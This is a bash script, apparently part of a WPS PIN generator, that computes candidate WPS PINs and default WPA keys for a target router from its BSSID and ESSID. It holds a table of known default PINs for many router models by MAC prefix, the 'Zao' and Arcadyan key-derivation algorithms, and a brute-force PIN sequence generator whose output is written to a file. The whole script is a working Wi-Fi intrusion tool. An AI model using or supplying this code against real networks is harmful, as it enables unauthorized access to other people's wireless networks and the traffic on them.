#!/bin/bash

RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0)
BLUE=$(tput setaf 6 && tput bold)

WPSPIN_Generator(){

GENERATE(){
DEFAULTWPA=""
APRATE=0
UNKNOWN=0
SPECIAL=0
FABRICANTE=""
MODEL=""
DEFAULTSSID=""
CHECKBSSID=$(echo $BSSID | cut -d ":" -f1,2,3 | tr -d ':')
FINBSSID=$(echo $BSSID | cut -d ':' -f4,5,6)
MAC=$(echo $FINBSSID | tr -d ':')
CONVERTEDMAC=$(printf '%d\n' 0x$MAC) 2> /dev/null

case $CHECKBSSID in

04C06F | 202BC1 | 285FDB | 346BD3 | 80B686 | 84A8E4 | B4749F | BC7670 | CC96A0 | F83DFF)    # For FTE-XXXX (HG552c), original algorithm by kcdtv  
FINESSID=$(echo $ESSID | cut -d '-' -f2)
PAREMAC=$(echo $FINBSSID | cut -d ':' -f1 | tr -d ':')
CHECKMAC=$(echo $FINBSSID | cut -d ':' -f2- | tr -d ':')
if [[ $ESSID =~ ^FTE-[[:xdigit:]]{4}[[:blank:]]*$ ]] &&   [[ $(printf '%d\n' 0x$CHECKMAC) = `expr $(printf '%d\n' 0x$FINESSID) '+' 7` || $(printf '%d\n' 0x$FINESSID) = `expr $(printf '%d\n' 0x$CHECKMAC) '+' 1` || $(printf '%d\n' 0x$FINESSID) = `expr $(printf '%d\n' 0x$CHECKMAC) '+' 7` ]];  
       
then
MACESSID=$(echo $PAREMAC$FINESSID)
PRESTRING=`expr $(printf '%d\n' 0x$MACESSID) '+' 7`
STRING=`expr '(' $PRESTRING '%' 10000000 ')' `

CHECKSUM

  else
  STRING=`expr '(' $CONVERTEDMAC '%' 10000000 ')' '+' 8`

  CHECKSUM

  PIN2=$PIN
  STRING=`expr '(' $CONVERTEDMAC '%' 10000000 ')' '+' 14`

  CHECKSUM

  PIN3=$PIN                                           

  ZAOMODE

  CHECKSUM

fi

FABRICANTE="HUAWEI"
DEFAULTSSID="FTE-XXXX"
MODEL="HG532c Echo Life"
ACTIVATED=1
;;
C8D15E )

FABRICANTE="HUAWEI"
DEFAULTSSID="Jazztel_XX "
MODEL="HG532c Echo Life"
ACTIVATED=1
;;
001915 )

PIN=12345670

FABRICANTE="TECOM Co., Ltd."
DEFAULTSSID="WLAN_XXXX"
MODEL="AW4062"
ACTIVATED=0
;;
F43E61 | 001FA4)

PIN=12345670

FABRICANTE="Shenzhen Gongjin Electronics Co., Ltd"
DEFAULTSSID="WLAN_XXXX"
MODEL="Encore ENDSL-4R5G"
ACTIVATED=1
;;
404A03)

PIN=11866428

FABRICANTE="ZyXEL Communications Corporation"
DEFAULTSSID="WLAN_XXXX"
MODEL="P-870HW-51A V2"
ACTIVATED=1
;;
001A2B)

PIN=88478760
PIN2=77775078
FABRICANTE="Ayecom Technology Co., Ltd."
DEFAULTSSID="WLAN_XXXX"
MODEL="Comtrend Gigabit 802.11n"
ACTIVATED=1
SPECIAL=1
;;
3872C0)

PIN=18836486
PIN2=20172527

FABRICANTE="Ayecom Technology Co., Ltd."
DEFAULTSSID="JAZZTEL_XXXX"
MODEL="Comtrend AR-5387un"
ACTIVATED=0
;;
FCF528)

PIN=20329761                           

FABRICANTE="ZyXEL Communications Corporation"
DEFAULTSSID="WLAN_XXXX"
MODEL="P-870HNU-51B"
ACTIVATED=1
APRATE=1

;;
3039F2)
PIN=16538061
PIN2=16702738
PIN3=18355604
PIN4=88202907
PIN5=73767053
PIN6=43297917
PIN7=19756967
PIN8=13409708
FABRICANTE="ADB-Broadband"
DEFAULTSSID="WLAN_XXXX"
MODEL="PDG-A4001N"
ACTIVATED=1

;;
74888B)                   ############# PIN WLAN_XXXX PDG-A4001N by ADB-Broadband > multiples generic PIN
PIN=43297917
PIN2=73767053
PIN3=88202907
PIN4=16538061
PIN5=16702738
PIN6=18355604
PIN7=19756967
PIN8=13409708
FABRICANTE="ADB-Broadband"
DEFAULTSSID="WLAN_XXXX"
MODEL="PDG-A4001N"
ACTIVATED=1

;;
A4526F)                  ############# PIN WLAN_XXXX PDG-A4001N by ADB-Broadband > multiples generic PIN
PIN=16538061
PIN2=88202907
PIN3=73767053 
PIN4=16702738
PIN5=43297917
PIN6=18355604
PIN7=19756967
PIN8=13409708
FABRICANTE="ADB-Broadband"
DEFAULTSSID="WLAN_XXXX"
MODEL="PDG-A4001N"
ACTIVATED=1
 
;;
DC0B1A)                   ############# PIN WLAN_XXXX PDG-A4001N by ADB-Broadband > multiples generic PIN
PIN=16538061
PIN2=16702738
PIN3=18355604
PIN4=88202907
PIN5=73767053
PIN6=43297917
PIN7=19756967
PIN8=13409708
FABRICANTE="ADB-Broadband"
DEFAULTSSID="WLAN_XXXX"
MODEL="PDG-A4001N"
ACTIVATED=1

;;
D0D412)                  ############# PIN WLAN_XXXX PDG-A4001N by ADB-Broadband > multiples generic PIN
PIN4=16538061
PIN2=16702738
PIN3=18355604
PIN=88202907
PIN5=73767053
PIN6=43297917
PIN7=19756967
PIN8=13409708
FABRICANTE="ADB-Broadband"
DEFAULTSSID="WLAN_XXXX"
MODEL="PDG-A4001N"
ACTIVATED=1

;;
5C4CA9 | 62233D | 623CE4 | 623DFF | 62559C | 627D5E | 6296BF | 62A8E4 | 62B686 | 62C06F | 62C61F | 62C714 | 62CBA8 | 62E87B | 6A1D67 | 6A233D | 6A3DFF | 6A53D4 | 6A559C | 6A6BD3 | 6A7D5E | 6AA8E4 | 6AC06F | 6AC61F | 6AC714 | 6ACBA8 | 6AD15E | 6AD167 | 723DFF | 7253D4 | 72559C | 726BD3 | 727D5E | 7296BF | 72A8E4 | 72C06F | 72C714 | 72CBA8 | 72D15E | 72E87B )   

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="HUAWEI"         ############# HUAWEI HG 566a vodafoneXXXX > Pin algo zao
DEFAULTSSID="vodafoneXXXX"
MODEL="HG 566a"
ACTIVATED=1

;;
002275)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Belkin"         ############# Belkin Belkin_N+_XXXXXX  F5D8235-4 v 1000  > Pin algo zao
DEFAULTSSID="Belkin_N+_XXXXXX"
MODEL="F5D8235-4 v 1000"
ACTIVATED=1

;;
08863B)

if [[ -n `(echo "$ESSID" | grep -E '_xt' )` ]];

  then 
UNKNOWN=2
FABRICANTE="Belkin"
DEFAULTSSID="XX...-xt"
MODEL="N300 Dual-Band Wi-Fi Range Extender"
ACTIVATED=1
APRATE=1
 else

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Belkin"         ############# Belkin belkin. F5D8235-4 v 1000  > Pin algo zao # update: several models share this bssid
DEFAULTSSID="belkin.XXX"
MODEL="F9K1104(N900 DB Wireless N+ Router)"
ACTIVATED=1
SPECIAL=1

fi

;;
001CDF)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Belkin"         ############# Belkin belkin. F5D8235-4 v 1000  > Pin algo zao
DEFAULTSSID="belkin.XXX"
MODEL="F5D8235-4 v 1000"
ACTIVATED=1

;;
00A026)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Teldat"         ############# Teldat WLAN_XXXX iRouter1104-W  > Pin algo zao
DEFAULTSSID="WLAN_XXXX"
MODEL="iRouter1104-W"
ACTIVATED=1

;;
5057F0)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="ZyXEL Communications Corporation"         ############# Zyxel ZyXEL zyxel NBG-419n  > Pin algo zao
DEFAULTSSID="ZyXEL"
MODEL="zyxel NBG-419n"
ACTIVATED=1

;;
C83A35 | 00B00C | 081075)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Tenda"         ############# Tenda W309R  > Pin algo zao, original router that was used by ZaoChusheng to reveal the security breach
DEFAULTSSID="cf. computepinC83A35"
MODEL="W309R"
ACTIVATED=1

;;
E47CF9 | 801F02)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="SAMSUNG"         ############# SAMSUNG   SEC_ LinkShare_XXXXXX  SWL (Samsung Wireless Link)  > Pin algo zao
DEFAULTSSID="SEC_ LinkShare_XXXXXX"
MODEL="SWL (Samsung Wireless Link)"
ACTIVATED=1

;;
0022F7)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Conceptronic"         ############# CONCEPTRONIC   C300BRS4A  c300brs4a  > Pin algo zao
DEFAULTSSID="C300BRS4A"
MODEL="c300brs4a"
ACTIVATED=1

;;                                 ########### NEW DEVICES SUPPORTED FOR VERSION 1.5 XD
F81A67 | F8D111 | B0487A | 647002 )              

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="TP-LINK"             ######## TP-LINK_XXXXXX  TP-LINK  TD-W8961ND v2.1   > Pin algo zao
DEFAULTSSID="TP-LINK_XXXXXX"
MODEL="TD-W8961ND v2.1"
ACTIVATED=1
APRATE=1

;;
001F1F)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="EDIMAX"              ########## EDIMAX 3G-6200n "Default"   > PIN ZAO
DEFAULTSSID="Default"
MODEL="3G-6200n"
ACTIVATED=1

;;
001F1F)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="EDIMAX"              ########## EDIMAX 3G-6200n/3G-6210n "Default"   > PIN ZAO
DEFAULTSSID="Default"
MODEL="3G-6200n & 3G-6210n"
ACTIVATED=1

;;
0026CE)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="KUZOMI"              ########## KUZOMI K1500 & K1550 "Default"   > PIN ZAO
DEFAULTSSID="Default"
MODEL="K1500 & K1550"
ACTIVATED=1

;;
90F652)

PIN=12345670

FABRICANTE="TP-LINK"            ########## TP-LINK  TP-LINK_XXXXXX  TL-WA7510N  > PIN   generic 12345670
DEFAULTSSID="TP-LINK_XXXXXX"
MODEL="TL-WA7510N"
ACTIVATED=1

;;
7CD34C)                        ########### SAGEM FAST 1704    > PIN GENERIC 43944552

PIN=43944552

FABRICANTE="SAGEM"
DEFAULTSSID="SAGEM_XXXX"
MODEL="fast 1704"
ACTIVATED=1

;;
000CC3)                               ########### BEWAN, two default ssid abd two default PIN ELE2BOX_XXXX > 47392717   Darty box ; 12345670

if [[ $ESSID =~ ^TELE2BOX_[[:xdigit:]]{4}[[:blank:]]*$ ]]; then

FABRICANTE="BEWAN"
DEFAULTSSID="TELE2BOX_XXXX"
MODEL="Bewan iBox V1.0"
ACTIVATED=1
APRATE=1
PIN=47392717

elif  [[ $ESSID =~ ^DartyBox_[[:xdigit:]]{3}_[[:xdigit:]]{1}*$ ]]; then

FABRICANTE="BEWAN"
DEFAULTSSID="DartyBox_XXX_X"
MODEL="Bewan iBox V1.0"
ACTIVATED=1
PIN=12345670

else

FABRICANTE="BEWAN"
DEFAULTSSID="TELE2BOX_XXXX / DartyBox_XXX_X"
MODEL="Bewan iBox V1.0"
ACTIVATED=1
APRATE=1
PIN=47392717
PIN2=12345670

fi

;;
A0F3C1)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="TP-LINK"             ######## TP-LINK_XXXXXX  TP-LINK TD-W8951ND   > Pin algo zao
DEFAULTSSID=$(echo "TP-LINK_XXXX(XX)")
MODEL="TD-W8951ND"
ACTIVATED=1
SPECIAL=1

;;
5CA39D | DC7144 | D86CE9)              # Bbox with Essid Bbox-XXXXXXXX, algo zao, no limits by samsung

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Samsung"
ACTIVATED=1
DEFAULTSSID="Bbox-XXXXXXXX"
MODEL="Bbox by Samsung"
ACTIVATED=1

;;
B8A386)          # D-Link DSL-2730U con PIN generico 20172527

DEFAULTSSID="Dlink_XXXX"
FABRICANTE="D-Link"
MODEL="D-Link DSL-2730U"
ACTIVATED=1
PIN=20172527

;;
C8D3A3)                  # D-Link DSL-2750U con PIN generico 21464065   

DEFAULTSSID="Dlink_XXXX"
FABRICANTE="D-Link"
MODEL="D-Link DSL-2750U"
ACTIVATED=1
PIN=21464065

;;
F81BFA | F8ED80)        # ZTE -  ZXHN_H108N  pin generico 12345670

DEFAULTSSID="MOVISTAR_XXXX"
FABRICANTE="ZTE"
MODEL="ZXHN_H108N"
ACTIVATED=1
PIN=12345670

;;
E4C146)               # Observa Telecom - Router ADSL (RTA01N_Fase2)

if [ -n "`(echo $ESSID | grep -F MOVISTAR)`" ] ; then

DEFAULTSSID="MOVISTAR_XXXX"
FABRICANTE="Observa Telecom para Objetivos y Servicios de Valor"
MODEL="RTA01N_Fase2"
ACTIVATED=0
PIN=71537573

elif [ -n "`(echo $ESSID | grep -F Vodafone)`" ] ; then

UNKNOWN=2

DEFAULTSSID="VodafoneXXXX"
FABRICANTE="Objetivos y Servicios de Valor"
MODEL="Unknown"
ACTIVATED=1
APRATE=1

else

DEFAULTSSID="MOVISTAR_XXXX or VodafoneXXXX"
FABRICANTE="Objetivos y Servicios de Valor"
MODEL="Unknown"
ACTIVATED=1
SPECIAL=1
PIN=71537573

fi

;;
087A4C | 0C96BF | E8CD2D )

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="HUAWEI"                             ##### HUAWEI HG532s de Orange (españa) 
DEFAULTSSID="Orange-XXXX"
MODEL="HG532s"
ACTIVATED=1

;;
1CC63C | 507E5D | 743170 | 849CA6 | 880355)   # original algorithms by Stefan Wotan-Stefan Viehböck-Coeman76 

FABRICANTE="Arcadyan Technology Corporation"
MODEL="ARV7510PW22"
ACTIVATED=1

if [ -n "`(echo $ESSID | grep -F Vodafone)`" ] ; then

DEFAULTSSID="VodafoneXXXX"
ARCADYAN
CHECKSUM

elif [ -n "`(echo $ESSID | grep -F Orange)`" ] ; then

UNKNOWN=2

else

DEFAULTSSID="VodafoneXXXX ?"
ARCADYAN
CHECKSUM

SPECIAL=1

fi

;;
EC233D )

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="HUAWEI"                             ##### HUAWEI HG532e de Djinouti 
DEFAULTSSID="HG532e-XXXXXX"
MODEL="HG532e"
ACTIVATED=1

;;
001DCF )

PIN=12345670

FABRICANTE="Arris Interactive  L.L.C"                            
DEFAULTSSID="ARRIS-XXXX"
MODEL="DG950A"
ACTIVATED=1

;;
BC1401 | 68B6CF | 00265B )

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Hitron Technologies"                            
DEFAULTSSID="ONOXXX0"
MODEL="CDE-30364"
ACTIVATED=0

;;
CC5D4E )

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="zyxell"                            
DEFAULTSSID="ZyXEL"
MODEL="WAP 3205"
ACTIVATED=1

;;
C03F0E | A021B7 | 2CB05D | C43DC7 | 841B5E | 008EF2 | 744401 | 30469A | 204E7F )


FABRICANTE="Netgear"
DEFAULTSSID="ONOXXXX"
MODEL="CG3100D"
ACTIVATED=0

UNKNOWN=2

;;
*)
if  [[ $ESSID =~ ^DartyBox_[[:xdigit:]]{3}_[[:xdigit:]]{1}*$ ]]; then

FABRICANTE="BEWAN"
DEFAULTSSID="DartyBox_XXX_X"
MODEL="Bewan iBox V1.0"
ACTIVATED=1
PIN=12345670

else
ZAOMODE                                                                   
CHECKSUM                                                                     

UNKNOWN=1

fi
;;
esac
}

CHECKSUM(){
PIN=`expr 10 '*' $STRING`
ACCUM=0
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`

DIGIT=`expr $ACCUM '%' 10`
CHECKSUM=`expr '(' 10 '-' $DIGIT ')' '%' 10`

PIN=$(printf '%08d\n' `expr $PIN '+' $CHECKSUM`)
}

ZAOMODE(){
STRING=`expr '(' $CONVERTEDMAC '%' 10000000 ')'`
}

recursive_generator()
{
    if (($1 == 0))                                        
    then 
         echo $2 
    else 
        for car in 0 1 2 3 4 5 6 7 8 9;                                      
        do 
            recursive_generator $(($1 - 1)) $2$car                             
        done                                                                   
    fi                                                                         
}

SEQUENCEFIRST()
{
if [ "$INICIOSEQUENCEFIRST" -gt "$FINSEQUENCEFIRST" ]; then
  for i in $(seq $FINSEQUENCEFIRST $INICIOSEQUENCEFIRST)  ;
    do
      printf '%04d\n' $i
  done | tac  2> /dev/null
else
  for i in $(seq $INICIOSEQUENCEFIRST $FINSEQUENCEFIRST)  ;
    do
      printf '%04d\n' $i
  done 2> /dev/null
fi
}

SEQUENCESECOND()
{
if [ "$INICIOSEQUENCESECOND" -gt "$FINSEQUENCESECOND" ]; then
  for i in $(seq $FINSEQUENCESECOND $INICIOSEQUENCESECOND)  ;
    do
      printf '%03d\n' $i
  done | tac  2> /dev/null
else
for i in $(seq $INICIOSEQUENCESECOND $FINSEQUENCESECOND)  ;
    do
      printf '%03d\n' $i
  done 2> /dev/null 
fi
}

BASICPINGENERATOR()
{
echo "$FIRSTHALFSESSION"
SEQUENCEFIRST 2> /dev/null
echo "$STARTSELECTEDPIN
$PART1
$STARTPIN
$STARTPIN2
$STARTPIN3
$STARTPIN4
$STARTPIN5
$STARTPIN6
$STARTPIN7
$STARTPIN8
1234
1186
8847
1883
2017
1653
1670
1835
8820
7376
4329
1975
1340
2032
4394
4739"
recursive_generator 4
echo "$SECONDHALFSESSION"
SEQUENCESECOND 2> /dev/null
echo "$ENDSELECTEDPIN
$PART2
$ENDPIN
$ENDPIN2
$ENDPIN3
$ENDPIN4
$ENDPIN5
$ENDPIN6
$ENDPIN7
$ENDPIN8
567
642
876
648
252
806
273
560
290
705
791
696
970
976
455
271"  
recursive_generator 3
}

ARCADYAN(){

## "Take the last 2 Bytes of the MAC-Address (0B:EC), and convert it to decimal." < original quote from easybox_keygen.sh
deci=($(printf "%04d" "0x`(echo $BSSID | cut -d ':' -f5,6 | tr -d ':')`" | sed 's/.*\(....\)/\1/;s/./& /g')) # supression of $take5 and $last4 compared with esaybox code, the job is directly done in the array value assignation, also the variable $MAC has been replaced by $BSSID taht is used in WPSPIN
## "The digits M9 to M12 are just the last digits (9.-12.) of the MAC:" < original quote from easybox_keygen.sh
hexi=($(echo ${BSSID:12:5} | sed 's/://;s/./& /g')) ######unchanged
## K1 = last byte of (d0 + d1 + h2 + h3) < original quote from easybox_keygen.sh
## K2 = last byte of (h0 + h1 + d2 + d3) < original quote from easybox_keygen.sh
c1=$(printf "%d + %d + %d + %d" ${deci[0]} ${deci[1]} 0x${hexi[2]} 0x${hexi[3]})  ######unchanged
c2=$(printf "%d + %d + %d + %d" 0x${hexi[0]} 0x${hexi[1]} ${deci[2]} ${deci[3]})  ######unchanged
K1=$((($c1)%16))  ######unchanged
K2=$((($c2)%16))  ######unchanged
X1=$((K1^${deci[3]}))  ######unchanged
X2=$((K1^${deci[2]}))  ######unchanged
X3=$((K1^${deci[1]}))  ######unchanged
Y1=$((K2^0x${hexi[1]}))  ######unchanged
Y2=$((K2^0x${hexi[2]}))  ######unchanged
Y3=$((K2^0x${hexi[3]}))  ######unchanged
Z1=$((0x${hexi[2]}^${deci[3]}))  ######unchanged
Z2=$((0x${hexi[3]}^${deci[2]}))  ######unchanged
Z3=$((K1^K2))  ######unchanged
STRING=$(printf '%08d\n' `echo $((0x$X1$X2$Y1$Y2$Z1$Z2$X3))` | rev | cut -c -7 | rev) # this to genrate later our PIN, the 7 first digit  
DEFAULTWPA=$(printf "%x%x%x%x%x%x%x%x%x\n" $X1 $Y1 $Z1 $X2 $Y2 $Z2 $X3 $Y3 $Z3 | tr a-f A-F | tr 0 1) # the change respected to the original script in the most important thing, the default pass, is the adaptation of Coeman76's work on spanish vodafone where he found out that no 0 where used in the final pass
DEFAULTSSID=$(echo "Vodafone-`echo "$BSSID" | cut -d ':' -f5,6 | tr -d ':' | tr 0 G`")  # the modification of the algorithm in this line is also a contribution of lampiweb forum, for default ssid if there should be a zero it is replaced by G 
}

OUTPUT(){

echo $PIN > $DIR/TempFolder/Pins.txt
echo $PIN1 >> $DIR/TempFolder/Pins.txt
echo $PIN2 >> $DIR/TempFolder/Pins.txt
echo $PIN3 >> $DIR/TempFolder/Pins.txt
echo $PIN4 >> $DIR/TempFolder/Pins.txt
echo $PIN5 >> $DIR/TempFolder/Pins.txt
echo $PIN6 >> $DIR/TempFolder/Pins.txt
echo $PIN7 >> $DIR/TempFolder/Pins.txt
echo $PIN8 >> $DIR/TempFolder/Pins.txt

}

DATASGENERADOR(){
echo ""

ESSID=$(cat $DIR/TempFolder/Chosen_Target_Line.txt | awk '{ print $1 }' | sed -e 's/+/ /g')
BSSID=$(cat $DIR/TempFolder/Chosen_Target_Line.txt | awk '{ print $2 }')
echo "  "
while !(echo $BSSID | tr a-f A-F | egrep -q "^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")
do
echo ""            
done
}

DATASGENERADOR
GENERATE
OUTPUT

}

DIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd | sed -e 's/\/Applications//g')

WPSPIN_Generator
